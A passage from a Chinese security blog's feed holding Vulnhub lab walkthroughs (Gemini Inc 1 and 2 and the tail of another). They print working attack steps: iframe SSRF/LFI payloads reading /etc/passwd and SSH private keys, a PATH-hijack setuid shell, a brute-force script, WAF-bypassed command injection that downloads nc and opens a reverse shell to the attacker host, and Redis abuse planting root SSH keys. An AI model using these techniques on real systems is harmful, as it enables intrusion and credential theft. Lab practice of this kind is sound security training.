class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2022-05-01 05:25:55 (38.2 MB/s) - <span class="string">&#x27;exp&#x27;</span> saved [17376/17376]</span><br><span class="line"></span><br><span class="line">www-data@ubuntu:/tmp$ ls</span><br><span class="line">ls</span><br><span class="line">exp</span><br><span class="line">www-data@ubuntu:/tmp$ chmod +x exp</span><br><span class="line">chmod +x exp</span><br><span class="line">www-data@ubuntu:/tmp$ ./exp</span><br><span class="line">./exp</span><br><span class="line">bash-4.4<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span><br></pre></td></tr></table></figure>
<p>直接提权成功。</p>
<h1 id="总结">3. 总结</h1>
<p>通过对该靶机的渗透，学习到了一下三点：</p>
<ol type="1">
<li>以后记得扫描UDP端口；</li>
<li>定制字典进行暴力破解</li>
<li>第一次遇到MOTD提权，虽然我直接用CVE-2021-3493提权了，但是该靶机上线的时间早于该漏洞</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>定制字典爆破</tag>
        <tag>UDP端口扫描</tag>
        <tag>webdav漏洞</tag>
        <tag>MOTD提权</tag>
        <tag>brainfuck</tag>
      </tags>
  </entry>
  <entry>
    <title>19 Vulnhub Gemini_Inc_1 Writeup</title>
    <url>/2022/05/02/19%20Vulnhub%20Gemini_Inc_1%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度中等，但不论是get shell还是本地提权，都学习到了新的知识。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/gemini-inc-1,227/">Gemini Inc: 1 ~ VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>中</li>
</ul>
<p>目标：</p>
<ul>
<li>获得root权限</li>
<li>拿到1个flag</li>
</ul>
<p>注释：</p>
<ul>
<li>使用VMWare Workstation</li>
</ul>
<p>攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>信息收集</li>
<li>开源代码泄露</li>
<li>XSS漏洞</li>
<li>SSRF漏洞</li>
<li><strong>LFI(location file inclusion)漏洞</strong></li>
<li><strong>服务端组件漏洞</strong></li>
<li>SSH公钥认证</li>
<li><strong>SUID权限漏洞</strong></li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<p>kali: 192.168.100.10 靶机: 192.168.100.21</p>
<p>因为在测试</p>
<h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 192.168.100.20</span><br><span class="line">sudo nmap -p22,80 -A 192.168.100.20</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502220323.png" /></p>
<p>信息：</p>
<ol type="1">
<li>22端口的服务为ssh，并且可能存在公钥认证的可能；</li>
<li>80端的服务为http，版本为Apache2.4.25</li>
<li>靶机操作系统为Debian</li>
</ol>
<h2 id="访问http服务">2.2. 访问http服务</h2>
<p>注意：这里需要挂梯子，否则会有资源加载不出来，并且过程非常的慢！这里推荐一篇文章：<a href="https://www.iculture.cc/cybersecurity/pig=265">Kali linux如何安装Clash-FancyPig's blog</a></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502220555.png" /></p>
<p>信息：</p>
<ol type="1">
<li>该网站上存在一个内网web应用，可以查看用户的详细信息，以及将信息打印成pdf -&gt; 这里可能存在SSRF；</li>
<li>该网站基于开源的项目修改搭建的；</li>
<li>存在登录功能点，但是不知道用户名和密码；</li>
</ol>
<p>访问源码，里面有许多文件，其中有一个install.php的文件，根据介绍，搭建该网站需要运行该文件，因此查看</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502220856.png" /></p>
<p>发现存在信息： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user: admin</span><br><span class="line">password: 1234</span><br></pre></td></tr></table></figure></p>
<p>成功登录admin用户。在登录的界面发现了两个功能点：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502221024.png" /></p>
<p>并且修改profile，可以将内容直接显示到该页面，因此可能存在XSS或者SSTI，SSTI可以排除，因为并没有用到什么模板，因此重点看一下是否存在XSS。经过测试，在display name这里输入脚本的时候成功执行</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502221225.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502221234.png" /></p>
<p>但是这里的XSS目前还没有什么利用信息。接下来测试第二个功能点，将信息打印成pdf（这里比较慢）查看文档信息，发现：（其实也可以在响应包中查看）</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502221511.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502221525.png" /></p>
<h2 id="get-shell">2.3. get shell</h2>
<p>因此搜索wkhtmltopdf exploit，还想该工具存在SSRF漏洞和LFI漏洞</p>
<ul>
<li><a href="https://www.virtuesecurity.com/kb/wkhtmltopdf-file-inclusion-vulnerability-2/">wkhtmltopdf File Inclusion Vulnerability - Virtue Security</a></li>
<li><a href="http://hassankhanyusufzai.com/SSRF-to-LFI/">SSRF to Local File Read - Hassan Khan Security Researcher</a></li>
</ul>
<p>首先，测试本地文件包含： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">display name: &lt;iframe src=&quot;file:///etc/passwd&quot; width=400 height=600&gt;</span><br></pre></td></tr></table></figure></p>
<p>并没有读取到内容。接着尝试远程文件包含：（尝试这一步之后就无法在点击actions了，需要重装虚拟机） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先在kali的/var/www/html目录下随便创建一个文件，并且输入随机内容</span><br><span class="line">// /var/www/html/1.txt</span><br><span class="line"></span><br><span class="line">然后开启Apache2: systemctl start apache2</span><br><span class="line"></span><br><span class="line">接着：</span><br><span class="line">display name: &lt;iframe src=&quot;http://192.168.100.10/1.txt&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502222416.png" /></p>
<p>可以进行远程文件包含。</p>
<p>最后的利用方式：</p>
<ol type="1">
<li><p>现在kali上编写一个php文件，内容为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">header(<span class="string">&quot;location:file://<span class="subst">$filename</span>&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>kali开启php 服务端</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -S 0.0.0.0:4444</span><br></pre></td></tr></table></figure></li>
<li><p>修改display name</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">display name: &lt;iframe src=&quot;http://192.168.100.10:4444/1.php?file=/etc/passwd&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>导出为pdf之后就能够看到/etc/passwd的内容了</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502231024.png" /></p></li>
</ol>
<blockquote>
<p>原理：（个人理解）由于存在远程文件包含，但是不存在本地文件包含，因此可以利用远程主机作为跳板，先访问远程主机的文件1.php，而该文件的内容是从定向到/etc/passwd，因此成功读取了其中的内容。</p>
</blockquote>
<p>接下来想到如果geminni1用户可以ssh公钥认证登陆的话，必定会存在id_rsa, id_rsa.pub, authorized_keys。并且路径为/home/gemini1/.ssh。只要我们拿到密钥，也就是id_rsa，即可不用密码登录。</p>
<p>id_rsa.pub和authorized_keys的内容一致，都是公钥，因此可以将三个都读取下来验证一下，想要使用ssh公钥认证登录，就必须将公钥改名为authorized_keys!</p>
<p>将display name修改为如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;http://192.168.100.10:4444/1.php?file=/home/gemini1/.ssh/id_rsa&quot; width=800 height=1000&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502231445.png" /></p>
<p>然后利用ssh登录 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br><span class="line">ssh gemini1@192.168.100.20 -i id_rsa</span><br><span class="line"></span><br><span class="line">注意：用什么用户创建的id_rsa就用什么用户登录！！看id_rsa的属主</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502232611.png" /></p>
<h2 id="权限提升">2.4. 权限提升</h2>
<p>本题使用的suid提权，首先输入如下命令查看拥有suid权限，并且属主为root的文件： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -user root -perm -u=s -ls 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502232914.png" /></p>
<p>其他文件都是Linux自带的，只有红框这个不是，因此运行此文件看一下内容</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502233009.png" /></p>
<p>还想右边的内容像是调用了Linux自带的命令，尤其最后一行像是date。因此利用strings命令查看一下该文件的内容 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">strings /usr/bin/listinfo</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502233139.png" /></p>
<p>可以分别执行这三条命令，会发现就是执行listinfo后右边显示的内容。注意到前三条都使用了绝对路径，而date没有使用，说明环境变量中可以找到date的目录。这就是我们可以利用的点。</p>
<hr />
<p>我们可以添加gemini1的家目录为环境变量，要放在date目录的前面，因为当执行date的时候，会顺着环境变量中的目录依次查看该目录下是否有可执行文件date，如果有，则执行，没有就查看下一个目录，如果全部目录都便利完都没有则报错。</p>
<p>因此，我们添加的目录必须在原来date目录的前面，然后在gemini1的家目录下创建一个date可执行文件，这样系统就会优先执行我们创建的date。</p>
<hr />
<p>添加环境变量： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/home/gemini1:<span class="variable">$PATH</span> <span class="comment"># 冒号为PATH中的分隔符，这样子表示将/home/gemini1添加在原来PATH的最前面</span></span><br></pre></td></tr></table></figure></p>
<p>在/home/gemini1目录下，编写文件，并编译为可执行文件 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	setuid(<span class="number">0</span>);</span><br><span class="line">	setgid(<span class="number">0</span>);</span><br><span class="line">	system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc date.c -o date</span><br></pre></td></tr></table></figure>
<p>最后，执行/usr/bin/listinfo，成功提权。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502234100.png" /></p>
<p>接下来查看flag： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// /root/flag.txt</span><br><span class="line"></span><br><span class="line">displaying current date...    mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm</span><br><span class="line"></span><br><span class="line">displaying current date...    </span><br><span class="line"></span><br><span class="line">displaying current date...    Congratulations on solving this boot2root machine!</span><br><span class="line"></span><br><span class="line">displaying current date...    Cheers!</span><br><span class="line"></span><br><span class="line">displaying current date...             _.._..,_,_</span><br><span class="line"></span><br><span class="line">displaying current date...            (          )</span><br><span class="line"></span><br><span class="line">displaying current date...             ]~,&quot;-.-~~[</span><br><span class="line"></span><br><span class="line">displaying current date...           .=])&#x27; (;  ([</span><br><span class="line"></span><br><span class="line">displaying current date...           | ]:: &#x27;    [</span><br><span class="line"></span><br><span class="line">displaying current date...           &#x27;=]): .)  ([</span><br><span class="line"></span><br><span class="line">displaying current date...             |:: &#x27;    |</span><br><span class="line"></span><br><span class="line">displaying current date...              ~~----~~</span><br><span class="line"></span><br><span class="line">displaying current date...    https://twitter.com/sec_9emin1</span><br><span class="line"></span><br><span class="line">displaying current date...    https://scriptkidd1e.wordpress.com</span><br><span class="line"></span><br><span class="line">displaying current date...    </span><br><span class="line"></span><br><span class="line">displaying current date...    mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm</span><br></pre></td></tr></table></figure></p>
<p>成为root之后，所有的输出都会带上一行左边的内容，这应该是/usr/bin/listinfo中date那行的内容。</p>
<h1 id="总结">3. 总结</h1>
<p>通过对该靶机的渗透，学到了许多东西：</p>
<ol type="1">
<li>遇到没见过的wen应用，先去搜索是否存在漏洞；</li>
<li>SSRF+LFI+XSS配合使用；</li>
<li>利用SUID提权找的是后来创建的文件，而不是Linux自带的；</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>wkhtmltopdf漏洞</tag>
        <tag>SUID提权</tag>
        <tag>SSH公钥认证</tag>
        <tag>XSS+SSRF+LFI配合</tag>
      </tags>
  </entry>
  <entry>
    <title>20 Vulnhub Gemini_Inc_2 Writeup</title>
    <url>/2022/05/03/20%20Vulnhub%20Gemini_Inc_2%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度中等，涉及redis相关漏洞。由于WAF的存在，感觉比较贴近现实。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/gemini-inc-2,234/">Gemini Inc: 2 ~ VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>中 -&gt; 高</li>
</ul>
<p>目标：</p>
<ul>
<li>取得root权限</li>
<li>拿到1个flag</li>
</ul>
<p>攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>信息收集</li>
<li><strong>隐藏路径爬取</strong></li>
<li>开放注册</li>
<li><strong>验证码爆破</strong></li>
<li><strong>Anti CSRF Token</strong></li>
<li>密码破解</li>
<li><strong>WAF Bypass</strong></li>
<li><strong>命令注入绕过</strong></li>
<li>SSH公钥认证</li>
<li>Redis漏洞利用</li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 192.168.100.21</span><br><span class="line">sudo nmap -p22,80 -A 192.168.100.21</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503211550.png" /></p>
<p>可以得到的信息很常规。</p>
<h2 id="访问http服务">2.2. 访问http服务</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503211635.png" /></p>
<p>与1不同的是，这里多了一个登录功能，尝试1的账号和密码，发现无法登录。除了这个之外，User List点进去是空白的页面，然后就没有其他的了。</p>
<p>接下来路径发现： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.100.21/</span><br></pre></td></tr></table></figure></p>
<p>然后对扫描到的路径一一检查，并没有发现有用的信息。（默默bb一句：dirsearch每次都扫不出关键的，因此强烈建议配合dirb和gobuster使用）隐藏路径爬取：（二选一） <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. dirb http://192.168.100.21 -X .php</span><br><span class="line">2. gobuster dir -u http://192.168.100.21/ -w /usr/share/dirb/wordlists/common.txt -x php,html,txt</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503212047.png" /></p>
<p>得到两个新的文件。前者目前还看不懂什么作用，不过从名字来看应该是激活用户的。而后者就是注册新用户的，因此先注册一个用户</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503212349.png" /></p>
<p>点击hack -&gt; My Profile之后url上回显示出u=17，猜测这是我们新用户的id。</p>
<p>用户需要激活，激活的code是一个6位的纯数字，联想到activate.php，应该就是利用该文件进行激活，code我们并不知道，因此需要爆破。</p>
<p>不过查看activate.php源码发现有一个隐藏的表单</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503212529.png" /></p>
<p>并且每次刷新都不同。随便填入一个code然后抓包发现</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503212732.png" /></p>
<p>会发现这里提交的token和源码中隐藏的token是一样的，并且多尝试提交几次，每次都是如此。合理怀疑这是CSRF token。这是需要注意的一个点。</p>
<h3 id="方法1">2.2.1. 方法1</h3>
<p>在网上找到别人写的一个脚本： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">url=<span class="string">&quot;http://192.168.100.21/activate.php&quot;</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> &#123;000000..999999&#125;; <span class="keyword">do</span></span><br><span class="line">    token=$(curl -s -c cookie <span class="variable">$url</span> | awk -F <span class="string">&#x27;value=&#x27;</span> <span class="string">&#x27;/token/ &#123;print $2&#125;&#x27;</span> | cut -d <span class="string">&quot;&#x27;&quot;</span> -f2)</span><br><span class="line">    resp=$(curl -s -w %&#123;http_code&#125; -b cookie --data <span class="string">&quot;userid=14&amp;activation_code=<span class="variable">$key</span>&amp;token=<span class="variable">$&#123;token&#125;</span>&quot;</span> <span class="variable">$url</span> | tail -n 1 | cut -d <span class="string">&quot;&gt;&quot;</span> -f2)</span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$resp</span> -ne 403 ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Key = &quot;</span><span class="variable">$key</span></span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></p>
<p>修改靶机的ip，然后执行，等待一段时间后 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀hdfzzf)-[~]</span><br><span class="line">└─<span class="comment"># ./geminiinc2.sh                                                                                   </span></span><br><span class="line">Key = 000511</span><br></pre></td></tr></table></figure></p>
<p>此时将得到的code提交即可激活。</p>
<h3 id="方法2">2.2.2. 方法2</h3>
<p>利用burp爆破，不过有点麻烦，需要设置许多东西。</p>
<ol type="1">
<li><p>将 Attack Type 设置成 Pitchfork</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503213421.png" /></p></li>
<li><p>设置第一个参数为numbers，并且整数部分的最大、最小长度都设置为6，因为必须是6为的数字</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503213554.png" /></p></li>
<li><p>设置第二个参数为，然后来到Options -&gt; Grep-Payload -&gt; add（只需要选中即可，burp会自动识别开始地方和结束地方）</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503213734.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503213821.png" /></p></li>
<li><p>Resource Pool中线程设置为1</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503214056.png" /></p></li>
<li><p>Options中的错误重试设置为0</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503214121.png" /></p></li>
</ol>
<p>注意：</p>
<ol type="1">
<li>每一步都要设置！！！</li>
<li>线程必须为1，因为我们需要捕捉token然后再发送下一个请求，无法多线程</li>
<li>最好用pro版本，会快一点</li>
</ol>
<p>我做演示就不从0开始了</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503214312.png" /></p>
<p>可以看到payload为000511的时候，状态码为302，并且下一个payload没有token了，这是因为000511是对的，此时被重定向到根目录了，所以不会再次产生token。</p>
<h2 id="get-shell">2.3. get shell</h2>
<p>进去之后，首先尝试了一下1的漏洞还在不在，发现不在了。接下来进行信息收集，只有一个User List</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503214535.png" /></p>
<p>经过一定时间观察，只有黄色名字的用户是administrator，其他都是member，并且个人账户的页面源码中会有password的注释</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503214637.png" /></p>
<p>查看了自己新建立的用户，并且自己的密码sha1加密之后的值和其一样，因此合理推测，administrator源码中的密码就是管理员的登录密码。找一个在线解密的平台解密得到密码为：secretpassword</p>
<p>然后直接登录。需要注意username和display name！</p>
<p>进入到管理员的后台之后，发现多了两个功能</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503215436.png" /></p>
<p>其中命令执行让我打起了精神，但是直接访问是空白，我们抓包看一下发生了什么事</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503215535.png" /></p>
<p>注意到侠士 IP NOT ALLOW，也就是后台可能开启了WAF，因此需要加入 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1 </span><br></pre></td></tr></table></figure></p>
<p>也可以加入其他头部。因为每个包都需要加这个，直接使用burp设置一下</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503215719.png" /></p>
<p>然后勾选上就可以了，这样子每个包burp就会自动添加上该头部。当然也可以用burp的插件，Bypass WAF，原理一样，自行搜索。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503215817.png" /></p>
<p>发现确实显示出了东西。但是这里执行的命令不会回显，只会显示</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503215850.png" /></p>
<p>并且，过滤了空格和cat（可能还有其他被过滤了，但是我比较关注这两个）空格其实比较好绕过，可以用%09代替，或者IFS。但是%09需要在burp里面修改，不能够直接在输入框里面，否则会再次被url编码，这里也推测出，后台还过滤了%。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503220155.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503220211.png" /></p>
<p>那么可以直接通过这里执行nc，反弹shell即可。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503220352.png" /></p>
<p>发现靶机上没有nc，但是kali上有，可以通过靶机的命令执行，下载kali的nc然后反弹。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali:</span><br><span class="line">1. <span class="built_in">cd</span> /usr/bin</span><br><span class="line">2. python3 -m http.server 80</span><br><span class="line"></span><br><span class="line">靶机：</span><br><span class="line">1. wget%09http://192.168.100.10:80/nc%09-O%09/tmp/nc <span class="comment"># 将nc保存到/tmp下面</span></span><br></pre></td></tr></table></figure></p>
<p>然后执行： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod%09%2bx%09/tmp/nc</span><br><span class="line">/tmp/nc%09192.168.100.10%094444%09-e%09/bin/bash</span><br></pre></td></tr></table></figure></p>
<p>注意：</p>
<ol type="1">
<li>chmod +x /tmp/nc的时候，如果直接在输入框输入，只需要修改空格为%09即可。因为自动会把+ url编码；如果在burp输入，需要把 + url编码，因为在burp中+就是空格；</li>
</ol>
<p>成功得到shell。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">gemini1@geminiinc:/var/www/html$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(gemini1) gid=1000(gemini1) groups=1000(gemini1),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)</span><br></pre></td></tr></table></figure>
<h3 id="番外">2.3.1. 番外</h3>
<p>其实除了使用%09代替空格之外，还可以使用IFS，[[远程命令、代码执行总结（PHP）]]</p>
<p>在传完nc之后，执行： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">IFS=:;val=/tmp/nc:192.168.100.10:4444:-e:/bin/bash;<span class="variable">$val</span></span><br></pre></td></tr></table></figure></p>
<p>也可以反弹shell。IFS=:的作用是将:全都转为空格。</p>
<h2 id="权限提升">2.4. 权限提升</h2>
<p>经过信息收集，发现没有suid、内核等常用的提权，但是在查看端口的时候发现开了6379端口，这是redis使用的端口，而redis又存在着许多漏洞。除此之外，还开起了3306，这是MySQL默认的端口。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503221607.png" /></p>
<p>这里需要注意现在获得的shell是不能够进行交互的，如果直接连接redis就会出不来，因此下面需要利用ssh登录获得完整的shell。但是我们不知道密码该怎么办呢？其实很简单，通过对端口服务的发现，可以猜测ssh可能可以ssh公钥认证登录。</p>
<p>先在kali上生成公私钥 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure></p>
<p>然后将公钥发送到靶机，并且保存为/home/gemini1/.ssh/authorized_keys <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">1. mkdir .ssh</span><br><span class="line">2. <span class="built_in">cd</span> .ssh</span><br><span class="line">3. /tmp/nc -lvnp 4444 &gt; authorized_keys</span><br><span class="line"></span><br><span class="line">kalil:</span><br><span class="line">1. nc 192.168.100.21 4444 &lt; id_rsa.pub -w 1</span><br><span class="line"></span><br><span class="line">靶机：</span><br><span class="line">1. chmod 600 authorized_keys</span><br><span class="line"></span><br><span class="line">kali:</span><br><span class="line">1. ssh gemini1@192.168.100.21 -i id_rsa</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503222619.png" /></p>
<p>我对redis的漏洞不熟，这里演示一下该漏洞的利用。</p>
<p>首先查看redis的配置文件，默认在/etc/redis <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/redis/6379.conf</span><br></pre></td></tr></table></figure></p>
<p>内容非常的多，要仔细看，发现了下面这段话</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503223106.png" /></p>
<p>有一个requirepass: 8a7b86a2cd89d96dfcc125ebcc0535e6。接下来就一步一步操作。</p>
<ol type="1">
<li><p>将authorized_keys转为txt格式，也就是redis能够识别的格式 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; cat authorized_keys; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; pub.txt</span><br></pre></td></tr></table></figure></p></li>
<li><p>将pub.txt的内容传入redis，作为一个键 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat pub.txt | redis-cli -a 8a7b86a2cd89d96dfcc125ebcc0535e6 -x <span class="built_in">set</span> ssh_key <span class="comment"># 键名可以随意</span></span><br></pre></td></tr></table></figure></p></li>
<li><p>连接到redis，并且进行相关配置 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. redis-cli -a 8a7b86a2cd89d96dfcc125ebcc0535e6 <span class="comment"># 登录redis</span></span><br><span class="line">2. config <span class="built_in">set</span> dir /root/.ssh <span class="comment"># 设置默认数据库目录为/root/.ssh</span></span><br><span class="line">3. config <span class="built_in">set</span> dbfilename authorized_keys <span class="comment"># 设置默认数据库名为authorized_keys</span></span><br><span class="line">4. save <span class="comment"># 导出</span></span><br></pre></td></tr></table></figure></p></li>
</ol>
<p>然后利用ssh登录root即可，密钥不变。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀hdfzzf)-[~/.ssh]</span><br><span class="line">└─<span class="comment"># ssh -i id_rsa root@192.168.100.21</span></span><br><span class="line">Linux geminiinc 4.9.0-5-amd64 <span class="comment">#1 SMP Debian 4.9.65-3+deb9u2 (2018-01-04) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Tue May  3 10:49:01 2022 from ::1</span><br><span class="line">root@geminiinc:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></p>
